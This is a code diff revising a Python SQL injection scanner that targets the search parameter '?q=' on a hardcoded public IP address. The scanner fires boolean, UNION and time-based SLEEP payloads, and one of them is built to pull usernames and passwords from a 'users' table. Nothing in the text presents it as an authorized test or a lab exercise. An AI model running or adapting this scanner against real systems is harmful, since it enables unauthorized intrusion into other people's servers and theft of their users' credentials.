@@ -1,180 +1,133 @@
 #!/usr/bin/env python3
 """
-Advanced SQLi Scanner v2 - Optimized for search bars & dynamic inputs
-Target: http://52.247.225.51
+Targeted SQLi Scanner for ?q= parameter
+Fixes: missed search bars, strict length checks, missing paths
 Python 3.8+ | pip install requests
 """
 
 import requests
-from urllib.parse import urlparse, parse_qs, urljoin, quote
+from urllib.parse import urlparse, urljoin
 import re
 import time
-import concurrent.futures
 import json
-import sys
 
 # ================= CONFIGURATION =================
-TARGET = "http://52.247.225.51"
+TARGET_BASE = "http://52.247.225.51"
 HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLi-Scanner/2.0",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLi-Scanner/3.0",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
 }
-TIMEOUT = 10
-MAX_DEPTH = 3
-WORKERS = 10
-TIME_SLEEP = 4          # Seconds for time-based payloads
-DEBUG = False           # Set True to print response snippets
+TIMEOUT = 12
+DEBUG = True          # Set False to hide verbose output
 
-# Common search parameters to force-test
-SEARCH_PARAMS = ["q", "search", "query", "s", "keyword", "term", "filter"]
+# Paths that likely host the search bar
+SEARCH_PATHS = ["/", "/search"]
+SEARCH_PARAM = "q"
 
-# SQLi Payloads (requests handles URL encoding automatically)
-SQLI_PAYLOADS = [
+# Base values to test before injection
+BASE_VALUES = ["", "test", "1", "'"]
+
+# SQLi Payloads (requests auto-encodes)
+PAYLOADS = [
     "' OR '1'='1",
     "' UNION SELECT NULL--",
     "' UNION SELECT 1,2,3--",
-    f"1' AND SLEEP({TIME_SLEEP})--",
+    f"1' AND SLEEP(4)--",
     "' OR 1=1--",
     "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --"
 ]
 
 # Detection patterns
-ERROR_PATTERNS = re.compile(
-    r"(SQL syntax|MySQL|PostgreSQL|Oracle|SQLite|Warning|Error|Unclosed quotation|"
-    r"syntax error|incorrect syntax|unclosed quote|near '' at line)",
-    re.I
-)
-CONTENT_KEYWORDS = ["admin", "root", "password", "user", "table", "column", "select"]
+ERROR_RE = re.compile(r"(SQL syntax|MySQL|PostgreSQL|Oracle|SQLite|Warning|Error|Unclosed quotation|syntax error|near '' at line)", re.I)
+SENSITIVE_KW = ["admin", "root", "password", "user", "table", "column", "select", "union"]
 
-# ================= CORE FUNCTIONS =================
-def get_baseline(url, params):
-    try:
-        resp = requests.get(url, params=params, headers=HEADERS, timeout=TIMEOUT)
-        return len(resp.text), resp.status_code, resp.text[:500]  # First 500 chars for debug
-    except Exception as e:
-        if DEBUG: print(f"[-] Baseline error: {e}")
-        return None, None, ""
-
-def test_param(url, param_name, original_val):
-    baseline_len, status, _ = get_baseline(url, {param_name: original_val})
-    if baseline_len is None:
-        return []
-
+# ================= CORE TESTER =================
+def test_url_param(url, param, base_val):
     results = []
-    for payload in SQLI_PAYLOADS:
-        test_params = {param_name: f"{original_val}{payload}"}
+    
+    # 1. Get baseline response
+    try:
+        baseline_resp = requests.get(url, params={param: base_val}, headers=HEADERS, timeout=TIMEOUT)
+        baseline_len = len(baseline_resp.text)
+        if DEBUG: print(f"📏 Baseline [{url}?{param}={base_val}] → Status: {baseline_resp.status_code} | Len: {baseline_len}")
+    except Exception as e:
+        if DEBUG: print(f"❌ Baseline error: {e}")
+        return results
+
+    # 2. Test each payload
+    for payload in PAYLOADS:
+        test_val = f"{base_val}{payload}"
         try:
-            resp = requests.get(url, params=test_params, headers=HEADERS, timeout=TIMEOUT)
+            resp = requests.get(url, params={param: test_val}, headers=HEADERS, timeout=TIMEOUT)
             is_vuln = False
             reason = ""
 
-            # 1. Error-based detection
-            if ERROR_PATTERNS.search(resp.text):
+            # Error-based
+            if ERROR_RE.search(resp.text):
                 is_vuln = True; reason = "Error-based"
-
-            # 2. Length/Content diff (ignore minor JS/CSS changes)
-            elif len(resp.text) != baseline_len or any(kw in resp.text.lower() for kw in CONTENT_KEYWORDS):
+            
+            # Length/Content diff (relaxed: >5% change or sensitive keywords)
+            elif len(resp.text) != baseline_len and (abs(len(resp.text) - baseline_len) / max(baseline_len, 1) > 0.05 or any(kw in resp.text.lower() for kw in SENSITIVE_KW)):
                 is_vuln = True; reason = "Boolean/Content"
 
-            # 3. Time-based detection
+            # Time-based fallback
             if not is_vuln:
-                time_params = {param_name: f"{original_val} AND SLEEP({TIME_SLEEP})--"}
+                time_val = f"{base_val} AND SLEEP(4)--"
                 start = time.time()
-                requests.get(url, params=time_params, headers=HEADERS, timeout=TIMEOUT + 5)
+                requests.get(url, params={param: time_val}, headers=HEADERS, timeout=TIMEOUT + 5)
                 elapsed = time.time() - start
-                if elapsed > TIME_SLEEP + 1.0:
-                    is_vuln = True; reason = "Time-based"
+                if elapsed > 3.0:
+                    is_vuln = True; reason = f"Time-based ({elapsed:.1f}s)"
 
+            # Record & log
             if is_vuln:
                 results.append({
                     "url": url,
-                    "param": param_name,
+                    "param": param,
+                    "base_value": base_val,
                     "payload": payload,
                     "type": reason,
                     "status_code": resp.status_code,
                     "response_length": len(resp.text)
                 })
+                if DEBUG: print(f"🚨 VULN FOUND → {url}?{param}={test_val[:50]}... | Type: {reason}")
+
         except Exception as e:
-            if DEBUG: print(f"[-] Payload error: {e}")
-    return results
-
-def crawl_and_test(base_url):
-    visited = set()
-    queue = [(base_url, 0)]
-    targets = []
-    netloc = urlparse(base_url).netloc
-
-    while queue:
-        url, depth = queue.pop(0)
-        if url in visited or depth > MAX_DEPTH: continue
-        visited.add(url)
-
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
-        if params:
-            targets.append((url, {k: v[0] for k, v in params.items()}))
-
-        try:
-            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
-            if resp.status_code != 200 or not resp.text: continue
-            links = re.findall(r'href=["\']([^"\']+)["\']', resp.text)
-            for link in links:
-                full = urljoin(base_url, link)
-                p = urlparse(full)
-                if (p.netloc == netloc and p.scheme in ('http','https') and '#' not in full):
-                    queue.append((full, depth + 1))
-        except: continue
-
-    return targets
-
-def test_search_bar_directly(base_url):
-    """Force-test common search parameters even if not found via crawling"""
-    parsed = urlparse(base_url)
-    base_path = parsed.path.rstrip('/') or '/'
-    results = []
-    
-    print(f"[*] Direct testing search bar at: {base_url}{base_path}")
-    for param in SEARCH_PARAMS:
-        # Test with empty, default, and common values
-        for val in ["", "test", "1", "'"]:
-            url = f"{parsed.scheme}://{parsed.netloc}{base_path}"
-            vulns = test_param(url, param, val)
-            results.extend(vulns)
+            if DEBUG: print(f"⏱️ Payload error: {e}")
+            
     return results
 
 # ================= MAIN EXECUTION =================
 def main():
-    print(f"🎯 Target: {TARGET}")
-    
-    # 1. Crawl & test found parameters
-    crawled_targets = crawl_and_test(TARGET)
-    print(f"[+] Found {len(crawled_targets)} URLs with query parameters.")
+    print(f"🎯 Target Base: {TARGET_BASE}\n")
     
     all_results = []
-    if crawled_targets:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as executor:
-            futures = [executor.submit(test_param, url, p) for url, params in crawled_targets for p in params]
-            for f in concurrent.futures.as_completed(futures):
-                all_results.extend(f.result())
+    
+    # Explicitly test both root and /search paths
+    for path in SEARCH_PATHS:
+        url = f"{TARGET_BASE}{path}" if path != "/" else TARGET_BASE
+        print(f"\n🔍 Testing search bar at: {url}")
+        
+        for base_val in BASE_VALUES:
+            vulns = test_url_param(url, SEARCH_PARAM, base_val)
+            all_results.extend(vulns)
 
-    # 2. Direct search bar testing (fixes missed inputs)
-    direct_results = test_search_bar_directly(TARGET)
-    all_results.extend(direct_results)
-
-    # 3. Output
+    # Output results
     if all_results:
         print("\n" + "="*60)
         print("🚨 SQL INJECTION VULNERABILITIES FOUND 🚨")
         print("="*60)
         for i, r in enumerate(all_results, 1):
             print(f"\n[{i}] URL: {r['url']}")
-            print(f"    Param: {r['param']} | Payload: {r['payload']}")
+            print(f"    Param: {r['param']} | Base: '{r['base_value']}'")
+            print(f"    Payload: {r['payload']}")
             print(f"    Type: {r['type']} | Status: {r['status_code']} | Len: {r['response_length']}")
-        with open("sqli_results_v2.json", "w", encoding="utf-8") as f:
+        
+        with open("sqli_q_results.json", "w", encoding="utf-8") as f:
             json.dump(all_results, f, indent=2)
-        print(f"\n💾 Saved to sqli_results_v2.json")
+        print(f"\n💾 Saved to sqli_q_results.json")
     else:
-        print("\n[+] No SQLi vulnerabilities detected.")
+        print("\n[+] No SQLi vulnerabilities detected for ?q=. Try adjusting TIMEOUT or checking network latency.")
 
 if __name__ == "__main__":
     main()
